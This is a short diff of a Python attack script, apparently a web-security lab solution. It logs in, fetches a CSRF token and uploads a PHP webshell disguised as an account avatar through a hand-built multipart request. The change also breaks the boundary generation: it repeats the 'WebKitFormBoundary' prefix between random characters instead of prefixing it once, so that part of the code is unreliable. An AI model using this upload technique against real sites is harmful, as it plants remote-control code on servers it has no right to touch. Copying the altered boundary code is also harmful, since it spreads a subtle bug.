@@ -45,7 +45,7 @@ def is_login_successful(url, session):
 def is_upload_webshell_successful(url, session):
     account_url = url + "/my-account"
     csrf_token = get_csrf_token(account_url, session)
-    avatar_url = url + "/my-account/avatar"
+    avatar_url = account_url + "/avatar"
     params = {
         "avatar": (
             'test.php',
@@ -55,8 +55,8 @@ def is_upload_webshell_successful(url, session):
         "csrf" : csrf_token
     }
     boundary = (
-        '------WebKitFormBoundary' + 
-        ''.join(random.sample(
+        '------WebKitFormBoundary'.join(
+            random.sample(
             string.ascii_letters + string.digits, 16)))
     multi_part = MultipartEncoder(
         fields=params,
